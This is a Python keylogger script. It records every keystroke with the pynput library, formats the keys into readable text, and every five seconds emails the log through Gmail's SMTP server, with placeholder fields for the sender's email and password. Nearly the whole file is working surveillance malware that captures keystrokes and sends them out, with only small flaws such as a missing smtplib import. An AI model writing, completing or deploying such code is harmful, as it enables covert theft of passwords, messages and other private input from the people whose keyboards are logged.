#! /usr/bin/env python3
import pynput
import threading

# to replace none special charcters edit try area

log = ""

# Crete email function
def send_mail(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()
# create keylogger and make it easier to read
def process_key_press(key):
	global log
	try:
		if str(key.char) == ".":
			log = log + ". "
		elif str(key.char) == "!":
			log = log + "! "
		elif str(key.char) == "?":
			log = log + "? "
		elif str(key.char) == ",":
			log = log + ", "
		else:
			log = log + str(key.char)
	except:
		if key == key.space:
			log = log + " "
		elif key == key.enter:
			log = log + " \n "
		elif key == key.shift:
			log = log + ""
		elif key == key.tab:
			log = log + "	"
		elif key == key.backspace:
			log = log + ""
		elif key == key.right:
			log = log + " [right] "
		elif key == key.left:
			log = log + " [left] "
		elif key == key.shift_r:
			log = log + ""
		else:
			log = log + " " + str(key) + " "
# Generate report every 5 seconds
def report():
	global log
	send_mail("Your email", "Your password", log)
	log = ""
	timer = threading.Timer(5, report)
	timer.start()

# start keylogger and report functions
keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
	report()
	keyboard_listener.join()
